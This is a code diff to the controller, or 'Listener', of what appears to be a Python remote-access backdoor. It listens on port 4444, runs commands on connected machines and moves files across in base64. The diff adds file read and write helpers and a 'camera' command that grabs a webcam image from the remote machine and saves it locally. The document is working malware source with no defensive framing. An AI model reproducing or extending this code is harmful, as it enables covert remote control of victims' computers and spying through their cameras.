@@ -52,7 +52,6 @@ class Listener:
 	def reliable_recive(self):
 		json_data = ""
 		while True:
-			print(json_data)
 			try:
 				if self.chosen_connection:
 					json_data += self.chosen_connection[0].recv(1024).decode()
@@ -60,6 +59,19 @@ class Listener:
 				else:
 					return ""
 			except: continue
+
+
+	def write_file(self, path, content):
+		content = base64.b64decode(content)
+		with open(path, "wb") as file:
+			file.write(content)
+			print(f"[+] You can see your file as {path}")
+
+
+	def read_file(self, path):
+		file = open(path, "rb").read()
+		file = base64.encodebytes(file).decode()
+		return file
 
 
 	def execute_remotely(self, command):
@@ -127,6 +139,12 @@ class Listener:
 				self.close()
 				exit()
 
+
+			elif command == "camera":
+				res = self.execute_remotely("camera")
+				self.write_file("one.jpg", res)
+			
+
 			elif len(command.split()):
 				if self.chosen_connection:
 					result = self.execute_remotely(command)
@@ -137,7 +155,7 @@ class Listener:
 
 
 if __name__ == "__main__":
-	listener = Listener("192.168.0.199", 4444)
+	listener = Listener("192.168.0.108", 4444)
 
 	listen_thread = threading.Thread(target=listener.listen)
 	listen_thread.start()
